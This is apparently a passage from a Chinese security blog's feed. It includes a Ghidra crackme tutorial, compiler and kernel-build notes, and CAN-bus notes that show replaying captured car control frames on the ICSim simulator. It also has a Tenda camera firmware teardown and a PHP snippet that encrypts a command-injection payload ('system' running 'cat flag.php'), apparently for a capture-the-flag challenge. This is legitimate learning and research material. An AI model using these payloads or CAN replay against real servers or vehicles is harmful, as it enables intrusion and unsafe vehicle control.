src="blob:file:///3bff1b5c-1dbd-402d-b07e-d1783c9f668b" alt="202004031538_RN4M7QS6PTEJ6JF.png">图标。</p><p>想要取消上一个撤回，选择Edit→Redo，或是在工具栏中点击 <img src="blob:file:///35861b4a-7b78-41d8-ad4d-f80b28acedfe" alt="202004031538_JEQ3H3ESTRGTNT3.png">图标。</p><p>#ghidra使用手册</p><p><strong>10.1 一个简单的Crackme</strong></p><p>在本章中，我们将会通过一些示例，线性地对Ghidra在实际使用中的操作流程做出示范。</p><p>由于我们并不期望正在阅读本章的读者，已经看过之前所有的内容，因此我们将尽量对每一步都做出详细的介绍，让该章节中的内容能单独形成一个简单的操作流程示范。</p><p><strong>10.1 一个简单的Crackme</strong></p><p>我们打开Ghidra，将想要分析的Crackme文件直接拖动到Ghidra的项目窗口当中。</p><p><img src="blob:file:///0fa7b222-cb70-4c77-b925-a6fe26c55696" alt="202004031539_XAMUDBMF76H5UD4.png"></p><p>图10-1 导入程序</p><p>可以看到，程序的格式、语言都已经被自动分析，我们可以直接输入在Ghidra中该程序的名称，并点击OK。</p><p><img src="blob:file:///4ce581fe-0a31-4815-8809-6c490c885d7a" alt="202004031539_MMJQKBWDKW3DQVU.png"></p><p>图10-2 信息总览</p><p>导入完成后，我们可以看到该文件信息总览。我们点击OK关闭该窗口，并在Ghidra的项目窗口中，选中已经导入的该程序，并双击以将其用默认的CodeBrowser工具打开。</p><p>打开后，Ghidra将提示我们，”simple_crackme has not been analyzed. Would you like to analyze it now?”。我们选择Yes。一个可以设置分析器的对话窗口将会随之弹出。</p><p><img src="blob:file:///dea09ba3-3188-4c7e-8cd4-94a9ba00f859" alt="202004031540_2EDQHRPBGH4MCVA.png"></p><p>图10-3 分析选项</p><p>无需对这些选项作出修改，我们直接使用默认的分析器设置，点击Analyze。窗口右下角的进度条将显示分析的进度。该范例中的Crackme文件非常小，因此分析将会极快地结束。</p><p>对于这种简单小巧的Crackme，我们往往希望找到main函数作为开始分析的切入点。该示例中，我们在界面左侧的Symbol Tree窗口中，点击Functions→main。</p><p> <img src="blob:file:///0fc5ccf4-0640-4a2d-a6a6-642bf4a84654" alt="202004031540_D3D4CWN3H5HVTSH.png"></p><p>图10-4 选中main函数</p><p>之后我们可以看到，在陈列（Listing）窗口与反编译（Decompile）窗口当中，显示出了main函数所对应的内容。</p><p> <img src="blob:file:///f24c1282-df5a-41a7-8ed6-132c1d09a691" alt="202004031541_VMYSKA55AWGUXKE.png"></p><p>图10-5 main的反编译内容</p><p>我们可以从函数签名入手，对数据类型做出的定义，由于对一个数据类型的定义将会传播至程序中各个位置，所以这是一个高效的切入点。</p><p>如上图，我们可以看到，Ghidra反编译器得到的函数签名为:</p><p>undefined8 main(int iParm1, undefined8* puParm2)</p><p>不难看出，我们需要将其还原为符合C标准的main函数函数签名，也即</p><p>int main(int argc, char *argv)</p><p>我们在反编译窗口中，右键并选择Edit Function Signature，并将其进行修改。</p><p>需要注意的是，由于Ghidra反编译器的特性，argv之中的并不会被当成数组的标志，而是将被看待为参数名称的一部分。所以我们需要将char* argv[]以char** argv的形式进行表示</p><p><img src="blob:file:///a4c1651c-0701-479e-9f5d-e6619a2e415d" alt="202004031541_9WKXEA38Q8PMZN7.png"></p><p>图10-6 修改函数签名</p><p>修改并应用新的函数签名后，我们可以看到，反编译的结果变得十分明了了。</p><p><img src="blob:file:///f8c120bd-2fe3-445b-8320-57846a47c327" alt="202004031541_G7YS5WP2UQUQFUZ.png"></p><p>图10-7 更改函数签名后的编译结果</p><p>接下来，我们可以通过重命名变量，或是添加注释的方式，进一步地增加反编译的可读性。比如，此处明显地，sVar1为一个指示长度的变量。我们选中它，并点击快捷键L，重命名sVar1为length。我们也可以点击;，在一处添加注释。</p><p>通过几步简单的操作，相信我们都已经十分清楚，这个main函数在做什么了。总的来说，参数需要为恰好一个，长度为10且第五个字符串为’@‘。</p><p>对于更为复杂的程序来说，我们需要对编译结果以及其可读性进行优化的过程也会不可避免地更为漫长。不过以每个函数的函数签名作为切入点，将仍是非常高效的方式。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>预处理，编译，汇编，链接</title>
    <link href="/article/9d94ce31.html"/>
    <url>/article/9d94ce31.html</url>
    
    <content type="html"><![CDATA[<p>预处理 gcc -E test.c -o test.i</p><p>以“#”号开头的预处理指令如包含#include,宏定义制定#define等。在源程序中这些指令都放在函数之外，而且一般放在源文件的前面。</p><p>使用预处理器把源文件test.c经过预处理生成test.i文件。</p><p>编译 gcc -S test.i -o test.s</p><p>这里的编译不是指程序从源文件到二进制程序的全部过程，而是指将经过预处理文件（test.i）之后的程序转换成特定汇编（test.s）代码的过程。</p><p>汇编 gcc -c test.s -o test.o</p><p>汇编过程将上一步的汇编代码转换成机器码，这一步产生的文件叫做目标文件，是二进制格式。</p><p>链接 gcc test.o -o test</p><p>链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。附加的目标文件包括静态连接库和动态连接库。</p>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>无线电学习随记</title>
    <link href="/article/3ffd580a.html"/>
    <url>/article/3ffd580a.html</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>智能汽车安全攻防大揭秘读书笔记</title>
    <link href="/article/a091bca6.html"/>
    <url>/article/a091bca6.html</url>
    
    <content type="html"><![CDATA[<p>实用obd接口可直接访问车内can总线，汽车OBDII接口的物理尺寸和针脚定义是国际标准，由SAE制定，欧盟也沿用了这个标准，最后全世界普及的也都是这个标准。（虽然OBD接口是通用的，但是can协议基本各家有各家的东西）</p><p>可以购买obd盒子(一种插 在OBD接又上的硬件设备，作用是将数据无线传输到手机或者服务器，然后对数据 进行可视化或分析)来尝试访问汽车数据和控制汽车。</p><p>obd盒子可作为研究方向的一种。</p>]]></content>
    
    
    <categories>
      
      <category>车联网</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>can总线</title>
    <link href="/article/16fe91ce.html"/>
    <url>/article/16fe91ce.html</url>
    
    <content type="html"><![CDATA[<p>雨夜，高架，疾驰的迈巴赫…</p><p>跑题了跑题了。</p><p>无论是驾驶还是乘坐车辆，你是否曾产生过一个疑问：车辆上的那么多功能和部件，它们是如何知道你在进行什么操作的？另外，仪表盘又是如何显示发动机转速的？</p><p>随着现代汽车功能的不断丰富，相应的硬件和传感器也越来越多。</p><p>通常，工程师们会将不同的硬件和功能归类到不同的系统中，并使用电子控制单元（ECU）来处理这些系统中的各种功能。然而，现代汽车更常见的做法是将相关功能集成到一个或多个ECU中，以提高整体效率和性能。</p><p>那么，这些ECU是如何相互通信的呢？</p><p>现代汽车中的各个电子控制单元（ECU）通过车载通信网络相互通信。这些通信网络通常采用标准的汽车通信协议，例如控制器局域网（CAN）或局域网通信（LIN）。每个ECU负责管理和控制特定的系统或子系统，例如发动机管理系统、制动系统、空调系统等。</p><p>当进行操作时，例如按下按钮、踩下油门踏板或转动方向盘，相应的传感器会感知到这些操作并将信息发送给负责该系统的ECU。ECU接收到这些输入信号后，会进行相应的处理并采取相应的控制措施，例如调整发动机转速、启动制动系统等。</p><p>仪表盘上的显示信息是由主要的仪表盘控制器负责。该控制器接收来自各个系统的信息，并根据需要显示在仪表盘上的显示屏上，包括发动机转速、车速、油量、水温等。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230613113240210.png" alt="image-20230613113240210"></p><p>这张图里涉及到两个不同的控制单元之间需要相互传递的数据。在传递每项信息时，通常需要使用一条数据线来进行传输。因此，如果存在5个不同的信息需要相互传递，那么就需要使用5条数据线。</p><p>然而，随着需要传递的信号项增多，控制单元之间的连接就会变得更加复杂。引脚数量的增加会导致线路布局的复杂化，进而可能增加故障发生的概率，并给维修工作带来一定的困难。</p><p>为了应对这个问题，产生了CAN总线（Controller Area Network）。CAN总线采用了一种更为高效和可靠的数据传输方式。它只需要使用两条数据线来传递所有控制单元之间的信息交换。通过使用CAN总线，各个控制单元可以直接将信息发送到总线上，而其他控制单元则可以从总线上接收到这些信息。这种基于总线的通信架构不仅简化了线路连接，还提高了系统的可靠性和可扩展性。</p><p>因此，CAN总线成为了许多领域中广泛应用的一种通信协议，特别适用于汽车、工业控制和机器人等领域。它在降低线路复杂性、提高系统稳定性和可靠性方面发挥着重要作用，为各个控制单元之间的数据传输提供了高效的解决方案。</p><p>如下图</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230614085636863.png" alt="image-20230614085636863"></p><p>在车内大概就是这样。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230614090243936.png" alt="image-20230614090243936"></p><p>通过采用CAN总线，能够有效地减少电控单元之间所需的针脚数量以及各种复杂的线束连接。</p><p>在不同的系统中，使用的总线速率有所不同。</p><p>高速CAN系统通常被称为动力型，主要用于控制电控单元、ABS系统等高速数据传输的场景。</p><p>而低速CAN系统则被称为舒适型，主要用于控制仪表、防盗系统等对速度要求较低的场景。</p><p>通过将系统划分为不同的CAN总线，可以根据不同的应用需求选择适当的速率，从而实现高效的数据传输和控制。这种分级的设计方案既满足了不同系统模块之间的通信需求，又能够有效地管理和分配系统资源，提高整体系统的性能和可靠性。</p><p>![image-20230614093539108](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230614093539108.png)</p><p>CAN总线通常使用双绞线，即两根扭在一起的导线，以提供良好的信号传输和抗干扰能力。</p><p>这两根线分别称为CAN-High（CAN-H）和CAN-Low（CAN-L），它们承载着CAN总线上的数据传输。</p><p>不同类型的CAN总线在线的颜色上有所区别，这些颜色可作为参考标准：</p><ul><li>驱动CAN（动力型CAN）的线路颜色通常为橙色（CAN-H）和黑色（CAN-L）。</li><li>舒适CAN（低速型CAN）的线路颜色通常为橙绿色（CAN-H）和橙棕色（CAN-L）。</li><li>信息娱乐CAN的线路颜色通常为橙紫色（CAN-H）和橙棕色（CAN-L）。</li></ul><p>CAN总线的二进制信号由CAN-H与CAN-L的电压差大小来表示</p><p>即： 信号&#x3D;CAN_H - CAN_L</p><p>具体的高低电平这里不赘述，可以自行查阅。</p><p>can通信帧分为数据帧、远程帧、错误帧、过载帧和帧间隔五种类型。</p><p>数据帧结构上由7个段组成，其中根据仲裁段ID码长度的不同，分为标准帧（CAN2.0A）和扩展帧（CAN2.0B）。</p><p>远程帧与数据帧差不多，但没有数据段。</p><p>错误帧，当canbus发生以下五种错误时，节点将主动发送错误帧</p><p>CRC错误，格式错误，应答错误，位发送错误，位填充错误。</p><p>当某个节点没有准备好接收下一帧准备的时候，会发送过载帧</p><p>帧间隔用于将数据帧或远程帧和他们之前的帧分离开，但过载帧和错误帧前面不会插入帧间隔。</p><p>can数据帧组成为：帧起始-仲裁段-控制段-数据段-CRC段- ACK段-帧结束</p><p>帧起始：由单个显性位组成。总线空闲时，发送节点发送帧起始， 其他接收节点同步于该帧起始位。</p><p>仲裁段：CAN-bus并没有规定节点优先级，但是多个节点只有一条总线，总归要有先后，仲裁段就解决了这些问题。</p><p>控制段：表述数据段的字节数</p><p>数据段：发送数据组成，可包含0-8个字节的数据。</p><p>CRC段：CAN-bus使用CRC校验进行数据检错，CRC校验值存放于CRC段。</p><p>ACK段：当一个接收节点接收的帧起始到CRC段之间的内容没发生错误时，它将在ACK段发送一个显性电平。</p><p>帧结束：结束。</p><p>可以在linux中可以使用ICSim来模拟</p><p>项目地址：<a href="https://github.com/zombieCraig/ICSim">https://github.com/zombieCraig/ICSim</a></p><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta"># </span><span class="language-bash">安装依赖</span>sudo apt install libsdl2-dev libsdl2-image-dev can-utils maven autoconf -y<span class="hljs-meta"># </span><span class="language-bash">下载ICSim</span>git clone https://github.com/zombieCraig/ICSim.git<span class="hljs-meta"># </span><span class="language-bash">编译安装</span>cd ICSim/sudo make</code></pre></div><p>socketcand</p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># 下载socketcand</span>git <span class="hljs-built_in">clone</span> https://github.com/linux-can/socketcand.git<span class="hljs-built_in">cd</span> socketcand<span class="hljs-comment"># 获取缺少的文件</span>wget https://raw.githubusercontent.com/dschanoeh/socketcand/master/config.h.in<span class="hljs-comment"># 编译安装</span>autoconf./configuremake cleanmakesudo make install</code></pre></div><p>启动模拟器</p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># 设置vcan（虚拟CAN）接口</span>sudo modprobe cansudo modprobe vcan<span class="hljs-comment"># ip link 命令启动 can 接口</span>sudo ip <span class="hljs-built_in">link</span> add dev vcan0 <span class="hljs-built_in">type</span> vcansudo ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> up vcan0<span class="hljs-built_in">cd</span> Icsim/<span class="hljs-comment"># 打开仪表盘模拟器</span>./icsim vcan0<span class="hljs-comment"># 打开仪表盘控制器</span>./controls vcan0</code></pre></div><p>![image-20230615105849708](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230615105849708.png)</p><table><thead><tr><th>功能</th><th>控制按钮</th></tr></thead><tbody><tr><td>转向</td><td>键盘左右</td></tr><tr><td>速度</td><td>键盘上下</td></tr><tr><td>开&#x2F;关左前车门</td><td>右shift&#x2F;左shit+A</td></tr><tr><td>开&#x2F;关右前车门</td><td>右shift&#x2F;左shit+B</td></tr><tr><td>开&#x2F;关左后车门</td><td>右shift&#x2F;左shit+X</td></tr><tr><td>开&#x2F;关右后车门</td><td>右shift&#x2F;左shit+Y</td></tr><tr><td>开启全部车门</td><td>左shift+右shift</td></tr><tr><td>关闭全部车门</td><td>右shift+左shift</td></tr></tbody></table><p>candump监听模拟器操作的数据包，再利用canplayer集合数据包重新回放一遍监听到的操作.</p><p>candump vcan0 -l</p><p>操作结束后在路径下会发现.log文件</p><p>使用canplayer重放数据包</p><p>canplayer -I can-xxxxx.log</p><p>由于can是在不停通信的，所有log内容会非常多。</p><p>一般用二分法来查找具体某条指令。</p><p>split -n 2 file</p><p>然后将两个文件分别重放，找到哪个里有需要的指令，然后继续分，继续重放，直到找到。</p><p>最后发现(1686800272.972740) vcan0 188#02000000为右转弯指令</p><p>在#之后看到02，猜测01为左转，修改尝试执行成功。</p><p>作为汽车内非常重要的一个东西，在车联网安全也是个重要的知识点。</p>]]></content>
    
    
    <categories>
      
      <category>车联网</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>golang 压缩体积</title>
    <link href="/article/49750c0a.html"/>
    <url>/article/49750c0a.html</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre><code class="hljs sh">go build -ldflags=<span class="hljs-string">&quot;-s -w&quot;</span> -o server main.go &amp;&amp; upx -9 server</code></pre></div><p>去除调试信息，upx最大压缩</p><p>相差4.4M</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230610110838616.png" alt="image-20230610110838616"></p>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php aes加密 向量重合</title>
    <link href="/article/335bf9d2.html"/>
    <url>/article/335bf9d2.html</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;aaaa&#x27;</span>;<span class="hljs-variable">$ciphertext</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;Ki3cH0Pl9gX3Qu4gk/La2l2WUK5WM6lO3yoarPOfKv6tLAAFt7LYtu1TsJBr/FLV&#x27;</span>);<span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>);<span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$ciphertext</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$iv_size</span>);<span class="hljs-variable">$encrypted</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$ciphertext</span>, <span class="hljs-variable">$iv_size</span>);<span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$encrypted</span>, <span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>, <span class="hljs-variable">$key</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$text</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;aaaa&#x27;</span>;<span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;)&quot;</span>;<span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>);<span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-variable">$iv_size</span>);<span class="hljs-variable">$ciphertext</span> = <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$text</span>, <span class="hljs-string">&#x27;AES-256-CBC&#x27;</span>, <span class="hljs-variable">$key</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$iv</span> . <span class="hljs-variable">$ciphertext</span>);<span class="hljs-meta">?&gt;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>linux系统编译-x86_64</title>
    <link href="/article/e55c327a.html"/>
    <url>/article/e55c327a.html</url>
    
    <content type="html"><![CDATA[<ol><li>编译Linux内核</li><li>编译busybox</li><li>制作文件系统</li><li>制作根文件系统镜像文件</li><li>利用qemu运行linux内核</li></ol><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#下载需要的工具</span>sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop</code></pre></div><h1 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h1><p><a href="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/">Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F; (sjtu.edu.cn)</a></p><blockquote><p>这里选择版本，从1.0 到 6.0都可以下载，看具体要求</p><p>这里是国内镜像站，源站为<a href="https://kernel.org/">The Linux Kernel Archives</a></p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="language-bash">下载内核</span>wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v6.x/linux-6.1.tar.gz<span class="hljs-meta">#</span><span class="language-bash">解压内核</span>tar -vxf linux-6.1.tar.gzcd linux-6.1<span class="hljs-meta">#</span><span class="language-bash">指定架构</span>export ARCH=x86<span class="hljs-meta">#</span><span class="language-bash">配置board config</span>make x86_64_defconfig<span class="hljs-meta">#</span><span class="language-bash">配置内核</span>make menuconfig<span class="hljs-meta">#</span><span class="language-bash">编译</span>make -j8</code></pre></div><blockquote><p>如果要编译其他架构的需要配置工具链 </p></blockquote><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> CROSS_COMPILE=</code></pre></div><blockquote><p>配置</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash">General setup  ---&gt;       ----&gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support    Device Drivers  ---&gt;       [*] Block devices  ---&gt;               &lt;*&gt;   RAM block device support               (65536) Default RAM disk size (kbytes)</code></pre></div><blockquote><p>图形化配置内核，记得保存再退出</p><p>make -j8 参数是多核编译，告诉编译器同时处理8个编译任务，能大大加快编译速度。</p></blockquote><p>编译好长这样。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516104921933.png" alt="image-20230516104921933"></p><h1 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h1><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#下载</span>wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2<span class="hljs-comment">#解压</span>tar -xvf busybox-1.36.0.tar.bz2<span class="hljs-built_in">cd</span> busybox-1.36.0<span class="hljs-comment">#配置 这里要配置静态文件 settings -&gt;  Build static binary (no shared libs)  </span>make menconfig<span class="hljs-comment">#编译</span>make &amp;&amp; make install</code></pre></div><p>配置</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Busybox </span>Settings  ---&gt;      <span class="hljs-keyword">Build </span>Options  ---&gt;            [*] <span class="hljs-keyword">Build </span><span class="hljs-keyword">BusyBox </span>as a static <span class="hljs-keyword">binary </span>(no <span class="hljs-keyword">shared </span>libs)</code></pre></div><p>编译好的busybox在_install 目录下</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516111650942.png" alt="image-20230516111650942"></p><h1 id="制作文件系统"><a href="#制作文件系统" class="headerlink" title="制作文件系统"></a>制作文件系统</h1><p>直接在_install文件夹下补充必要文件夹</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> _install<span class="hljs-comment"># -p参数是确保存在</span><span class="hljs-built_in">mkdir</span> -p etc dev mnt proc sys tmp proc sys <span class="hljs-built_in">mkdir</span> -p etc/init.d/<span class="hljs-comment">#当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。</span><span class="hljs-comment">#详情请看</span>vim etc/fstab  proc        /proc           proc         defaults        0        0  tmpfs       /tmp            tmpfs      defaults        0        0  sysfs       /sys            sysfs        defaults        0        0<span class="hljs-comment"># rcS是一个脚本文件，在inittab文件中本解析调用，用于配置Linux系统。</span>vim etc/init.d/rcS<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Welcome to linux&quot;</span>/bin/mount -a  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Remounting the root filesystem&quot;</span>  mount  -o  remount,rw  /  <span class="hljs-built_in">mkdir</span> -p /dev/pts  mount -t devpts devpts /dev/pts  <span class="hljs-built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug  mdev -s<span class="hljs-built_in">chmod</span> 755 etc/init.d/rcS<span class="hljs-comment"># inittab是Linux系统中的一个配置文件，它定义了系统启动时要执行的进程和服务</span>vim etc/inittab::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r<span class="hljs-built_in">chmod</span> 755 etc/inittab<span class="hljs-built_in">cd</span> dev<span class="hljs-comment">#mknod 命令建立一个目录项和一个特殊文件的对应索引节点。</span>sudo <span class="hljs-built_in">mknod</span> console c 5 1sudo <span class="hljs-built_in">mknod</span> null c 1 3sudo <span class="hljs-built_in">mknod</span> tty1 c 4 1</code></pre></div><h1 id="制作根文件系统镜像文件"><a href="#制作根文件系统镜像文件" class="headerlink" title="制作根文件系统镜像文件"></a>制作根文件系统镜像文件</h1><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#从上一步返回到busybox源码文件夹，_install的上层目录</span><span class="hljs-comment">#创建一个32M的文件，内容全部填充为0。</span><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=./rootfs.ext3  bs=1M count=32<span class="hljs-comment">#格式化rootfs.ext3</span>mkfs.ext3 rootfs.ext3<span class="hljs-comment">#创建fs文件夹，将rootfs挂载到fs</span><span class="hljs-built_in">mkdir</span> fssudo mount -o loop rootfs.ext3 ./fs<span class="hljs-comment">#将_install放入fs</span>sudo <span class="hljs-built_in">cp</span> -rf ./_install/* ./fs<span class="hljs-comment">#卸载镜像文件</span>sudo umount ./fs<span class="hljs-comment">#打包镜像</span>gzip --best -c rootfs.ext3 &gt; rootfs.img.gz</code></pre></div><p>这里提供了脚本，可以直接使用</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">rm</span> -rf rootfs.ext3<span class="hljs-built_in">rm</span> -rf fs<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=./rootfs.ext3 bs=1M count=32mkfs.ext3 rootfs.ext3<span class="hljs-built_in">mkdir</span> fsmount -o loop rootfs.ext3 ./fs<span class="hljs-built_in">cp</span> -rf ./_install/* ./fsumount ./fsgzip --best -c rootfs.ext3 &gt; rootfs.img.gz</code></pre></div><h1 id="使用qemu运行内核"><a href="#使用qemu运行内核" class="headerlink" title="使用qemu运行内核"></a>使用qemu运行内核</h1><div class="code-wrapper"><pre><code class="hljs bash">qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.30.0/rootfs.img.gz -append <span class="hljs-string">&quot;root=/dev/ram init=/linuxrc console=ttyS0&quot;</span> -serial file:output.txt -nographic</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tendacp3</title>
    <link href="/article/e3065a82.html"/>
    <url>/article/e3065a82.html</url>
    
    <content type="html"><![CDATA[<p>这里就先不放设备照片了，诸位可以自己在该页面寻找下设备型号。</p><p>这款路由器是通过云端进行数据传输的，即 摄像头 &#x3D; 云端 &#x3D; 手机，无web页面，且并未发现摄像头与手机直接通信。</p><h2 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h2><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0338.jpeg" alt="IMG_0338"></p><p>前边这个黄色印字的pcb我并没有查出来具体是做什么的，但是我看这个设备介绍是有高清夜视能力的，我猜是这么个功能，不重要。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715093743157.png" alt="image-20220715093743157"></p><p>使用了上海富瀚的FH8626V100，下面是各种文档，详细文档我没找到。</p><blockquote><p><a href="https://www.fullhan.com/index.php?c=article&amp;id=221">https://www.fullhan.com/index.php?c=article&amp;id=221</a></p><p><a href="https://www.fullhan.com/uploads/2021/11/163669725327888.pdf">https://www.fullhan.com/uploads/2021/11/163669725327888.pdf</a></p><p><a href="https://blog.csdn.net/xue_nuo/article/details/125717256?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-125717256-blog-122374192.pc_relevant_multi_platform_whitelistv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/xue_nuo/article/details/125717256?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-125717256-blog-122374192.pc_relevant_multi_platform_whitelistv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p><p><a href="https://blog.csdn.net/xue_nuo/article/details/122374192">https://blog.csdn.net/xue_nuo/article/details/122374192</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0371.jpeg" alt="IMG_0371"></p><p>flash 为H25S64，从查出来的资料来看是8m的，很遗憾的是我的ch341a并不支持这个型号的闪存，所以提取写入固件操作也办不到。</p><p>只能吧信息放到这了，原谅我硬件知识的匮乏。</p><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>这里因为flash型号的问题我没办法从固件提取，但是官网可以直接获取，且并没有加密。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715102403033.png" alt="image-20220715102403033"></p><p>squashfs 文件系统，但解包出来的文件系统在cpio文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715110812734.png" alt="image-20220715110812734"></p><p>但涉及到一部分的文件还是在squashfs-root中</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715111032612.png" alt="image-20220715111032612"></p><p>只有一个root账户默认开启。密码并没有爆破出来。</p><p>通过rcS文件的分析和对uart的输出信息来看，主要为两个服务 noodles 和apollo。后边会有分析。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715113120175.png" alt="image-20220715113120175"></p><p>文件格式为32位arm小端序</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715112602198.png" alt="image-20220715112602198"></p><h2 id="uart"><a href="#uart" class="headerlink" title="uart"></a>uart</h2><p>该设备有uart接口，并且将每个用处都标注出来了。但是是被堵上的，需要将杜邦线焊接上去。</p><p>（请忽略我的焊接技术，我真没学过）</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0342.jpeg" alt="IMG_0342"></p><p>波特率为115200，tenda好多设备都都是这个。</p><p>下面是通过打印获取到的一些信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715143628881.png" alt="image-20220715143628881"></p><p>这里理论上摁E可以不使用自动启动，但我没有成功。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715144742789.png" alt="image-20220715144742789"></p><p>linux内核</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715145126558.png" alt="image-20220715145126558"></p><p>可以看到cpu相关的sdk。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715145228397.png" alt="image-20220715145228397"></p><p>两个服务的启动。noodles 和 